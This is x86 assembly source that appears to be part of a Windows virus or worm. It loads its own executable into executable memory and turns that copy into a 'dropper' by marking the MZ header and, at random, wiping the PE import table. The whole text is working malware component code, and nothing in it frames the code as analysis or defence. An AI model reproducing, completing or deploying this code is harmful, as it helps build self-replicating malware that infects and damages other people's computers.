
  ; get current file
  ; output:  ESI=file ptr (in memory)
  ;          ECX=file size
  ;          EDX not changed

getargv0:               push    edx

                        mov     esi, argv0_ptr
                        mov     ecx, argv0_size

                        or      esi, esi
                        jnz     __exit

                        call    getargv0_filename

                        lea     edx, argv0_filename

                        debugmsg argv0r, edx

                        call    fopen_ro
                        xchg    ebx, eax

                        call    fgetsize
                        xchg    edi, eax

                        push    PAGE_EXECUTE_READWRITE  ; allocate memory
                        push    MEM_RESERVE+MEM_COMMIT
                        push    edi
                        push    0
                        call    xxVirtualAlloc  ; also init memory to zero
                        xchg    esi, eax

                        mov     edx, esi
                        mov     ecx, edi
                        call    fread

                        call    fclose

                        mov     argv0_ptr, esi
                        mov     argv0_size, ecx

                        call    argv0_prepare_dropper

__exit:                 pop     edx
                        ret

getargv0_filename:      pusha
                        cld

                        call    xxGetCommandLineA
                        xchg    esi, eax
                        lea     edi, argv0_filename
                        mov     edx, edi

                        cmp     byte ptr [esi], '"'
                        jne     __1
                        inc     esi

__1:                    lodsb
                        cmp     al, 32
                        je      __2
                        stosb
                        or      al, al
                        jnz     __1

__2:                    cmp     byte ptr [edi-1], '"'
                        jne     __3
                        dec     edi
__3:
                        xor     al, al
                        stosb

                        debugmsg argv0fn, edx

                        popa
                        ret

; make dropper from current file
; ESI=file ptr (in memory)
; ECX=file size
;
argv0_prepare_dropper:  pusha

                        mov     byte ptr [esi].mz_csum, 'ð' ; archive dropper

                        rnd     29
                        jz      __skip

                        mov     eax, [esi].mz_neptr       ; ESI=PE header
                        add     esi, eax
                        add     eax, size pe_struc
                        cmp     eax, ecx
                        jae     __skip

                        xor     eax, eax
                        mov     [esi].pe_importtablerva, eax ; kill import
                        mov     [esi].pe_importtablesize, eax
__skip:

                        popa
                        ret
